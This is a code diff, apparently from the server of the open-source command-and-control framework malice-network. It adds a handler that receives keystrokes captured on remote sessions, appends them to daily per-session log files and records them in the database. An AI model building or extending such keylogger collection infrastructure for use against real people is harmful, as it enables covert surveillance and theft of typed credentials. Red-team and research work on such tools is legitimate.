@@ -16,6 +16,7 @@ import (
 	"github.com/chainreactors/malice-network/server/internal/configs"
 	"github.com/chainreactors/malice-network/server/internal/db"
 	"github.com/chainreactors/malice-network/server/internal/db/models"
+	"gorm.io/gorm"
 )
 
 func PushContextEvent(Op string, ctx *models.Context) {
@@ -214,4 +215,106 @@ func ReadFileForContext(ctx output.Context) ([]byte, error) {
 		return nil, err
 	}
 	return data, nil
+}
+
+// findTodayKeyloggerContext
+func findTodayKeyloggerContext(task *Task) (*models.Context, error) {
+	today := time.Now().Format("2006-01-02")
+
+	var existingContext models.Context
+	result := db.Session().Model(&models.Context{}).
+		Joins("JOIN sessions ON contexts.session_id = sessions.session_id").
+		Where("sessions.session_id = ? AND contexts.type = ? AND DATE(contexts.created_at) = ?",
+			task.SessionId, consts.ContextKeyLogger, today).
+		First(&existingContext)
+
+	if result.Error != nil {
+		if errors.Is(result.Error, gorm.ErrRecordNotFound) {
+			return nil, nil
+		}
+		return nil, result.Error
+	}
+
+	return &existingContext, nil
+}
+
+func HandleKeylogger(data []byte, task *Task) error {
+	today := time.Now().Format("2006-01-02")
+	filename := fmt.Sprintf("%s_%s.log", task.SessionId, today)
+	savePath := filepath.Join(configs.ContextPath, task.SessionId, consts.KeyLoggerPath, filename)
+	if len(data) == 0 {
+		return nil
+	}
+	if err := os.MkdirAll(filepath.Dir(savePath), os.ModePerm); err != nil {
+		return err
+	}
+
+	file, err := os.OpenFile(savePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	if _, err := file.Write(data); err != nil {
+		return err
+	}
+
+	if _, err := file.WriteString("\n"); err != nil {
+		return err
+	}
+	existingContext, err := findTodayKeyloggerContext(task)
+	if err != nil {
+		return err
+	}
+	fileInfo, err := os.Stat(savePath)
+	if err != nil {
+		return err
+	}
+	checksum, _ := fileutils.CalculateSHA256Checksum(savePath)
+	var ictx *models.Context
+	if existingContext != nil {
+		var ctx output.KeyLoggerContext
+		if err := json.Unmarshal(existingContext.Value, &ctx); err != nil {
+			return err
+		}
+
+		ctx.Checksum = checksum
+		ctx.FilePath = savePath
+		ctx.Size = fileInfo.Size()
+
+		value, err := json.Marshal(ctx)
+		if err != nil {
+			return err
+		}
+
+		existingContext.Value = value
+		err = db.Session().Save(existingContext).Error
+		if err != nil {
+			return err
+		}
+
+		ictx = existingContext
+	} else {
+		ctx := &output.KeyLoggerContext{
+			FileDescriptor: &output.FileDescriptor{
+				Name:       filename,
+				Checksum:   checksum,
+				TargetPath: "KeyLogger",
+				FilePath:   savePath,
+				Size:       fileInfo.Size(),
+			},
+		}
+		ictx, err = SaveContext(ctx, task)
+		if err != nil {
+			return err
+		}
+	}
+	EventBroker.Publish(Event{
+		EventType: consts.EventContext,
+		Op:        consts.ContextKeyLogger,
+		Task:      task.ToProtobuf(),
+		Message:   fmt.Sprintf("new keylog has been added to the context: %s", ictx.ID),
+	})
+
+	return nil
 }
